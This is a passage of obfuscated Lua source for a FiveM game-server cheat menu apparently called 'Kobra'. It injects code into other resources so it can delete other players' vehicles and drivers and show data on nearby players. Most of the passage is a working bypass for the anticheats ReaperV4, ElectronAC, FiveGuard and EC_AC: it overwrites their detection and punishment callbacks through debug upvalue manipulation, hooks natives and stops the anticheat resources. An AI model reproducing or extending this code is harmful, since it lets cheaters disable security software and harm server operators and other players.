MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1573   .. [[)
                                        ]] );end v1641=1;end if (v1641==(254 -(245 + 7))) then Wait(1);SetPedIntoVehicle(v1375,v1571, -(748 -(212 + 535)));Wait(450);ClearPedTasksImmediately(v1375);v1641=14 -11 ;end if (v1641==(1479 -(905 + 571))) then Wait(1172 -922 );SetPedIntoVehicle(v1375,v1571, -1);break;end end end break;end end end CreateThread(function() if v1384 then if ((v1386~=(0 -0)) and IsEntityAVehicle(v1386)) then local v1635=0 -0 ;local v1636;while true do if (v1635==(0 + 0)) then v1636=v1386;v1387(v1636);break;end end end end end);break;end if (v1372==(1469 -(522 + 941))) then v1375=PlayerPedId();v1376=GetEntityCoords(v1375);v1377=GetCamCoord(_G.KobraFreecamObject);v1378=GetCamRot(_G.KobraFreecamObject,2);v1372=7;end if (v1372==(1518 -(292 + 1219))) then v1379=v1374(v1378);v1380=1000;v1381=v1377 + (v1379 * v1380) ;v1382=StartShapeTestRay(v1377.x,v1377.y,v1377.z,v1381.x,v1381.y,v1381.z, -(1113 -(787 + 325)),v1375,0 -0 );v1372=8 + 0 ;end if (v1372==(8 -4)) then hNative("PlayerPedId",function(v1574,...) return v1574(...);end);hNative("NetworkRequestControlOfEntity",function(v1575,...) return v1575(...);end);hNative("NetworkHasControlOfEntity",function(v1576,...) return v1576(...);end);v1373=nil;v1372=539 -(424 + 110) ;end if (v1372==5) then function v1373(v1577,v1578) v1578=v1578 or (1147 + 853) ;local v1579=GetGameTimer();while (GetGameTimer() -v1579)<v1578  do if NetworkHasControlOfEntity(v1577) then return true;end NetworkRequestControlOfEntity(v1577);Wait(0 + 0 );end return NetworkHasControlOfEntity(v1577);end v1374=nil;function v1374(v1580) local v1581=0 + 0 ;local v1582;local v1583;local v1584;while true do if (v1581==1) then v1584=math.abs(math.cos(v1583));return vector3( -math.sin(v1582) * v1584 ,math.cos(v1582) * v1584 ,math.sin(v1583));end if (v1581==(312 -(33 + 279))) then v1582=math.rad(v1580.z);v1583=math.rad(v1580.x);v1581=1 + 0 ;end end end function GetEmptySeat(v1585) local v1586=1353 -(1338 + 15) ;local v1587;while true do if (v1586==1) then return  -(1424 -(528 + 895));end if (v1586==0) then v1587={ -(1925 -(1606 + 318)),0 -0 ,3 -2 ,2};for v1637,v1638 in ipairs(v1587) do if IsVehicleSeatFree(v1585,v1638) then return v1638;end end v1586=1;end end end v1372=6;end if (v1372==2) then hNative("GetShapeTestResult",function(v1588,...) return v1588(...);end);hNative("GetPedInVehicleSeat",function(v1589,...) return v1589(...);end);hNative("SetEntityVisible",function(v1590,...) return v1590(...);end);hNative("DeletePed",function(v1591,...) return v1591(...);end);v1372=5 -2 ;end if (v1372==(1116 -(712 + 403))) then hNative("GetEntityCoords",function(v1592,...) return v1592(...);end);hNative("GetCamCoord",function(v1593,...) return v1593(...);end);hNative("GetCamRot",function(v1594,...) return v1594(...);end);hNative("StartShapeTestRay",function(v1595,...) return v1595(...);end);v1372=452 -(168 + 282) ;end end end elseif (v809=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1388=0 -0 ;local v1389;while true do if (v1388==(0 + 0)) then v1389=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1389,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1478,v1479) local v1480=0;local v1481;while true do if (v1480==0) then v1481=_G[v1478];if ( not v1481 or (type(v1481)~="function")) then return;end v1480=1;end if (v1480==(1 + 0)) then _G[v1478]=function(...) return v1479(v1481,...);end;break;end end end hNative("CreateThread",function(v1482,...) return v1482(...);end);hNative("Wait",function(v1483,...) return v1483(...);end);hNative("DoesEntityExist",function(v1484,...) return v1484(...);end);hNative("GetEntityCoords",function(v1485,...) return v1485(...);end);hNative("GetCamCoord",function(v1486,...) return v1486(...);end);hNative("GetCamRot",function(v1487,...) return v1487(...);end);hNative("StartShapeTestRay",function(v1488,...) return v1488(...);end);hNative("GetShapeTestResult",function(v1489,...) return v1489(...);end);hNative("GetPedInVehicleSeat",function(v1490,...) return v1490(...);end);hNative("SetEntityVisible",function(v1491,...) return v1491(...);end);hNative("DeletePed",function(v1492,...) return v1492(...);end);hNative("ClearPedTasksImmediately",function(v1493,...) return v1493(...);end);hNative("SetEntityCoordsNoOffset",function(v1494,...) return v1494(...);end);hNative("IsEntityAVehicle",function(v1495,...) return v1495(...);end);hNative("SetPedIntoVehicle",function(v1496,...) return v1496(...);end);hNative("PlayerPedId",function(v1497,...) return v1497(...);end);hNative("NetworkRequestControlOfEntity",function(v1498,...) return v1498(...);end);hNative("NetworkHasControlOfEntity",function(v1499,...) return v1499(...);end);local function v1457(v1500,v1501) v1501=v1501 or 2000 ;local v1502=GetGameTimer();while (GetGameTimer() -v1502)<v1501  do if NetworkHasControlOfEntity(v1500) then return true;end NetworkRequestControlOfEntity(v1500);Wait(0 -0 );end return NetworkHasControlOfEntity(v1500);end local function v1458(v1503) local v1504=0;local v1505;local v1506;local v1507;while true do if (v1504==(1452 -(1242 + 209))) then v1507=math.abs(math.cos(v1506));return vector3( -math.sin(v1505) * v1507 ,math.cos(v1505) * v1507 ,math.sin(v1506));end if (v1504==(679 -(20 + 659))) then v1505=math.rad(v1503.z);v1506=math.rad(v1503.x);v1504=1;end end end function GetEmptySeat(v1508) local v1509=0;local v1510;while true do if (v1509==0) then v1510={ -1,0,1 -0 ,621 -(427 + 192) };for v1625,v1626 in ipairs(v1510) do if IsVehicleSeatFree(v1508,v1626) then return v1626;end end v1509=1;end if (v1509==(2 -1)) then return  -(1 + 0);end end end local v1459=PlayerPedId();local v1460=GetEntityCoords(v1459);local v1461=GetCamCoord(_G.KobraFreecamObject);local v1462=GetCamRot(_G.KobraFreecamObject,1949 -(1427 + 520) );local v1463=v1458(v1462);local v1464=1000;local v1465=v1461 + (v1463 * v1464) ;local v1466=StartShapeTestRay(v1461.x,v1461.y,v1461.z,v1465.x,v1465.y,v1465.z, -(1 + 0),v1459,0 -0 );local v1467,v1468,v1469,v1467,v1470=GetShapeTestResult(v1466);local function v1471(v1511) if ( not v1511 or  not DoesEntityExist(v1511)) then return;end local v1512=GetPedInVehicleSeat(v1511, -(1 + 0));if ((v1512~=(1232 -(712 + 520))) and DoesEntityExist(v1512)) then local v1602=0 -0 ;while true do if (v1602==(1346 -(565 + 781))) then SetPedIntoVehicle(v1459,v1511,0);v1457(v1511,2565 -(35 + 530) );Wait(5 + 5 );for v1642=0 -0 ,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1512   .. [[)
                                        ]] );end v1602=1;end if (v1602==(1381 -(1330 + 48))) then SetEntityCoordsNoOffset(v1459,v1460.x,v1460.y,v1460.z,true,true,true,true);Wait(71 + 29 );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1511   .. [[)
                                    ]] );break;end if (v1602==(1 + 0)) then Wait(40);SetPedIntoVehicle(v1459,v1511, -(1 -0));Wait(1);SetPedIntoVehicle(v1459,v1511,GetEmptySeat(v1511));v1602=8 -6 ;end if (v1602==2) then Wait(1170 -(854 + 315) );SetPedIntoVehicle(v1459,v1511, -(3 -2));Wait(136 + 314 );ClearPedTasksImmediately(v1459);v1602=47 -(31 + 13) ;end end else SetPedIntoVehicle(v1459,v1511, -1);Wait(142 -42 );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1511   .. [[)
                                    ]] );Wait(231 -131 );SetEntityCoordsNoOffset(v1459,v1460.x,v1460.y,v1460.z,true,true,true,true);end end CreateThread(function() if v1468 then if ((v1470~=(0 + 0)) and IsEntityAVehicle(v1470)) then local v1627=563 -(281 + 282) ;local v1628;while true do if (v1627==(0 -0)) then v1628=v1470;v1471(v1628);break;end end end end end);end end end end local v479=v17[v15];if v479 then if ((v479.type=="slider") or (v479.type=="slider-checkbox")) then local v810=0 + 0 ;local v811;local v812;while true do if (v810==0) then v811=v479.max or (1049 -(216 + 733)) ;v812=GetGameTimer();v810=1848 -(137 + 1710) ;end if (v810==1) then if (v811<=(27 -17)) then if (IsControlPressed(538 -(100 + 438) ,1539 -(205 + 1160) ) and ((v812-v289)>v290)) then v12:ScrollTwo("Left");v289=v812;elseif (IsControlPressed(0 + 0 ,175) and ((v812-v289)>v290)) then v12:ScrollTwo("Right");v289=v812;end elseif IsControlPressed(0 + 0 ,1479 -(535 + 770) ) then v12:ScrollTwo("Left");elseif IsControlPressed(0 + 0 ,175) then v12:ScrollTwo("Right");end break;end end end end end end);local v102=0 + 0 ;local v103=2114 -(211 + 1783) ;local v104=0 + 0 ;local v105=1549 -(1236 + 193) ;local v106=910 -(793 + 117) ;local v107=120;MachoOnKeyDown(function(v291) local v292=tonumber(v291) or v291 ;local v293=v44[v292] or "Unknown" ;local v294=GetGameTimer();if (v293==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v293=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v293=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v293=="Q") and ((v294-v106)>v107)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v293=="E") and ((v294-v106)>v107)) then if (v13 and v24) then v12:NextCategory();end elseif ((v293=="ArrowUp") and ((v294-v102)>v103)) then if v13 then v12:ScrollOne("Up");v102=v294;end elseif ((v293=="ArrowDown") and ((v294-v102)>v103)) then if v13 then local v1391=1892 -(1607 + 285) ;while true do if (v1391==(860 -(747 + 113))) then v12:ScrollOne("Down");v102=v294;break;end end end elseif (v293=="ArrowLeft") then local v1392=v17[v15];if v1392 then if ((v1392.type=="slider") or ((v1392.type=="slider-checkbox") and ((v294-v104)>v105))) then local v1603=1976 -(80 + 1896) ;local v1604;local v1605;while true do if (v1603==(0 -0)) then v1604=v1392.max or 100 ;v1605=GetGameTimer();v1603=1 -0 ;end if (v1603==(1 + 0)) then if (v1604<=10) then local v1643=0;while true do if (v1643==(0 -0)) then v12:ScrollTwo("Left");v104=v1605;break;end end else v12:ScrollTwo("Left");end break;end end elseif ((v1392.type=="scrollable") or (v1392.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end elseif (v293=="ArrowRight") then local v1513=0 + 0 ;local v1514;while true do if (v1513==(0 -0)) then v1514=v17[v15];if v1514 then if ((v1514.type=="slider") or ((v1514.type=="slider-checkbox") and ((v294-v104)>v105))) then local v1644=0 + 0 ;local v1645;local v1646;while true do if ((0 + 0)==v1644) then v1645=v1514.max or (239 -139) ;v1646=GetGameTimer();v1644=1;end if (v1644==(455 -(246 + 208))) then if (v1645<=(1902 -(614 + 1278))) then v12:ScrollTwo("Right");v104=v1646;else v12:ScrollTwo("Right");end break;end end elseif ((v1514.type=="scrollable") or (v1514.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end break;end end elseif (v293=="F5") then local v1606=v17[v15];if (v13 and v24 and v1606 and ((v1606.type=="button") or (v1606.type=="checkbox") or (v1606.type=="slider-checkbox"))) then local v1629=0;while true do if (v1629==0) then v12:HideUI();Wait(250);v1629=1;end if ((1 + 0)==v1629) then v60(("Bind %s"):format(v1606.label),"",function(v1650) for v1651,v1652 in pairs(v44) do if (v1652:lower()==v1650:lower()) then local v1657=314 -(249 + 65) ;local v1658;while true do if ((2 -1)==v1657) then if v1658 then local v1667=1275 -(726 + 549) ;while true do if (v1667==(0 + 0)) then v25[ #v25 + 1 ]={key=v1658,keyRaw=v1651,keyLabel=v44[v1651],type=v1606.type,label=v1606.label,checked=v1606.checked or false ,value=v1606.value or (1425 -(916 + 508)) ,step=v1606.step or (0.25 -0) ,min=v1606.min or (0.25 + 0) ,max=v1606.max or (328 -(140 + 183)) ,onSelect=v1606.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(362 + 138 );v1657=2;end if ((564 -(297 + 267))==v1657) then v1658=v45[v1651];for v1665,v1666 in pairs(v25) do if (v1666.keyRaw==v1651) then local v1669=0;while true do if (v1669==(0 + 0)) then v12:Notify("error","Kobra","There is already a keybind with that key!",3000);return;end end end end v1657=1;end if (v1657==2) then v12:ShowUI();return;end end end end end,"keybind");break;end end end elseif v24 then for v1639,v1640 in pairs(v25) do if (v1640.type=="button") then local v1647=342 -(37 + 305) ;local v1648;while true do if (v1647==0) then v1648=v1640.keyRaw;if v1648 then if (v1648==v292) then v1640.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1640.label),4266 -(323 + 943) );end end break;end end elseif (v1640.type=="checkbox") then local v1653=0 + 0 ;local v1654;while true do if ((0 -0)==v1653) then v1654=v1640.keyRaw;if (v1654 and (v1654==v292)) then local v1663=1535 -(394 + 1141) ;while true do if (v1663==(2 + 0)) then v12:Notify((v1640.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1640.checked and "enabled") or "disabled" ,v1640.label),3000);if v13 then v12:UpdateElements(v17);end break;end if (v1663==1) then if v1640.onSelect then v1640.onSelect(v1640.checked);end v12:ShowKeybindList(v25);v1663=1 + 1 ;end if (v1663==0) then v1640.checked= not v1640.checked;v12:UpdateTabChecked(v16,v1640.label,v1640.checked);v1663=1 + 0 ;end end end break;end end elseif (v1640.type=="slider-checkbox") then local v1659=0 -0 ;local v1660;while true do if (v1659==(0 -0)) then v1660=v1640.keyRaw;if (v1660 and (v1660==v292)) then v1640.checked= not v1640.checked;v12:UpdateTabChecked(v16,v1640.label,v1640.checked);if v1640.onSelect then v1640.onSelect(v1640.value,v1640.checked);end v12:ShowKeybindList(v25);v12:Notify((v1640.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1640.checked and "enabled") or "disabled" ,v1640.label),2748 + 252 );if v13 then v12:UpdateElements(v17);end end break;end end end end end end);v12.InListMenu=function(v295) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v296) local v297=0 + 0 ;local v298;while true do if (v297==(529 -(87 + 442))) then if ( not v18 or  not v18[v19]) then return;end v298=v18[v19];v297=806 -(13 + 792) ;end if (v297==2) then v296:UpdateElements(v17);break;end if (v297==(1 + 0)) then if (v298.label~="List") then return;end for v746,v747 in ipairs(v298.tabs) do if (v747.type=="checkbox") then local v854=0 + 0 ;while true do if (v854==0) then v747.checked=true;if (v747.serverId and tonumber(v747.serverId)) then v27[tonumber(v747.serverId)]=true;end break;end end end end v297=2;end end end;v12.UnselectEveryone=function(v299) if ( not v18 or  not v18[v19]) then return;end local v300=v18[v19];if (v300.label~="List") then return;end for v480,v481 in ipairs(v300.tabs) do if (v481.type=="checkbox") then v481.checked=false;if (v481.serverId and tonumber(v481.serverId)) then v27[tonumber(v481.serverId)]=false;end end end v299:UpdateElements(v17);end;v12.ClearSelection=function(v301) local v302=0 + 0 ;while true do if (v302==(1866 -(1231 + 634))) then v12:UnselectEveryone();break;end if (v302==(1766 -(1362 + 404))) then v27={};if (v18 and v18[v19]) then local v814=0 -0 ;local v815;while true do if (v814==0) then v815=v18[v19];if ((v815.label=="List") and v815.tabs) then for v1218,v1219 in ipairs(v815.tabs) do if (v1219.type=="checkbox") then v1219.checked=false;end end end break;end end end v302=1 + 0 ;end end end;v12.UpdateListMenu=function(v303) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v304=v18[v19];if (v304.label~="List") then return;end local v305=GetEntityCoords(PlayerPedId());if  not v305 then return;end local v306=v303:GetNearbyPlayers(v305,982 -632 ,true);local v307;for v482,v483 in ipairs(v304.tabs) do if ((v483.type=="divider") and (v483.label=="Nearby Players")) then v307=v482;break;end end if  not v307 then return;end for v484= #v304.tabs,v307 + 1 , -(1017 -(660 + 356)) do table.remove(v304.tabs,v484);end if ( #v306==(0 -0)) then v304.tabs[ #v304.tabs + 1 + 0 ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v306,function(v665,v666) return tonumber(v665.serverId)<tonumber(v666.serverId) ;end);for v667,v668 in ipairs(v306) do local v669=tonumber(v668.serverId);if (v669 and v668.name) then local v816,v817=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v669)));v304.tabs[ #v304.tabs + (1951 -(1111 + 839)) ]={type="checkbox",label=("%s - [%s]"):format(v668.name,v669),serverId=v669,checked=v27[v669] or false ,name=v668.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v669)))~=(951 -(496 + 455))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v669)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v669)))~=(698 -(66 + 632))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v669))) , -(1 -0))==GetPlayerPed(GetPlayerFromServerId(v669))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v669)))))   .. ".0m" },{key="Server ID",value=v669},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v669))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v669))),color="0, 132, 255"},{key="Weapon",value=v28[v817] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v669)))~=(1277 -(1016 + 261))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v669)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v669))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v669))) * 3.6 )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v669))) and "Visible") or "Invisible" }},onSelect=function(v855) v27[v669]=v855 or false ;end};end end end for v485,v486 in pairs(v27) do local v487=0;local v488;while true do if (v487==(0 + 0)) then v488=false;for v819,v820 in ipairs(v306) do if (tonumber(v820.serverId)==tonumber(v485)) then v488=true;break;end end v487=380 -(113 + 266) ;end if (v487==(1171 -(979 + 191))) then if  not v488 then v27[v485]=nil;end break;end end end v15=math.min(v15 or (1 -0) ,math.max(1, #v304.tabs));local v308,v309=pcall(function() v303:UpdateElements(v17);end);if  not v308 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v309) );end end;v12.AssignListMenuActions=function(v310) if  not v16 then return;end for v489,v490 in ipairs(v16) do if ((v490.label=="Server") and v490.categories) then for v748,v749 in ipairs(v490.categories) do if ((v749.label=="List") and v749.tabs) then for v957,v958 in ipairs(v749.tabs) do if (v958.type=="button") then if (v958.label=="Select Everyone") then v958.onSelect=function() v12:SelectEveryone();end;elseif (v958.label=="Un-Select Everyone") then v958.onSelect=function() v12:UnselectEveryone();end;elseif (v958.label=="Clear Selection") then v958.onSelect=function() v12:ClearSelection();end;end end end end end end end end;CreateThread(function() while true do local v491=1735 -(339 + 1396) ;while true do if (v491==0) then Wait(441 + 1059 );if (v12:InListMenu() and v13) then local v858=0;local v859;local v860;while true do if (v858==(0 + 0)) then v859,v860=pcall(function() v12:UpdateListMenu();end);if  not v859 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v860) );end break;end end end break;end end end end);Wait(1000);v12:AssignListMenuActions();local v114=nil;local v115=nil;local function v116() local v311=0;while true do if (v311==0) then for v750=0 -0 ,GetNumResources() -(1 + 0)  do local v751=0 + 0 ;local v752;local v753;while true do if (v751==1) then if (v753 and (string.find(v753,"https://electron-services.com") or string.find(v753,"Electron Services") or string.find(v753,"The most advanced fiveM anticheat"))) then v114=v752;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v752 );return v752;end break;end if (v751==(347 -(187 + 160))) then v752=GetResourceByFindIndex(v750);v753=LoadResourceFile(v752,"fxmanifest.lua");v751=2 -1 ;end end end return nil;end end end local function v117() for v492=0,GetNumResources() -1  do local v493=0;local v494;local v495;while true do if (v493==0) then v494=GetResourceByFindIndex(v492);v495=GetNumResourceMetadata(v494,"client_script");v493=3 -2 ;end if (v493==1) then for v821=0 + 0 ,v495-(3 -2)  do local v822=0 + 0 ;local v823;while true do if (v822==0) then v823=GetResourceMetadata(v494,"client_script",v821);if (v823 and string.find(v823,"obfuscated")) then v115=v494;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v494 );return v494;end break;end end end break;end end end return nil;end v12.LoadBypass=function(v312) local v313={"216.146.24.88:30120","91.190.154.74:30120"};local v314=GetCurrentServerEndpoint();for v496,v497 in ipairs(v313) do if (v314==v497) then v312:Notify("error","Kobra","Bypass disabled for this server.",5599 -2599 );return;end end v312:Notify("info","Kobra","Loading Anticheat Bypass...",3328 -(56 + 272) );v116();v117();Wait(1000);if (GetResourceState("ReaperV4")=="started") then MachoInjectResource2(2 + 0 ,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000,function(...) return false,false;end);MachoHookNative(10181871000000000000,function(...) return false,3;end);MachoHookNative(12777102000000000000,function(...) return false,true;end);MachoHookNative(15349248000000000000 -(450 + 984) ,function(...) return false,0;end);MachoHookNative(18127728000000000000 -(500 + 836) ,function(...) return false,true;end);print("ReaperV4 Bypass Enabled");v312:Notify("info","Kobra","ReaperV4 Bypass Loaded",2193 + 807 );elseif (v114~=nil) then local v754=1423 -(162 + 1261) ;while true do if (v754==(0 + 0)) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(2,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v115~=nil) then CreateThread(function() while true do local v1039=1999 -(762 + 1237) ;while true do if (v1039==0) then MachoResourceStop(v115);print("^7[^5Kobra^7]: Stopped Resource: "   .. v115 );v1039=1 -0 ;end if (v1039==(270 -(265 + 4))) then Wait(5061 -3061 );break;end end end end);return;elseif (GetResourceState("EC_AC")=="started") then local v1040=0 + 0 ;local v1041;while true do if (v1040==(3 -1)) then CreateThread(function() while true do local v1305=0;while true do if (v1305==(0 -0)) then Wait(0 + 0 );MachoResourceStop("EC_AC");break;end end end end);break;end if (v1040==0) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
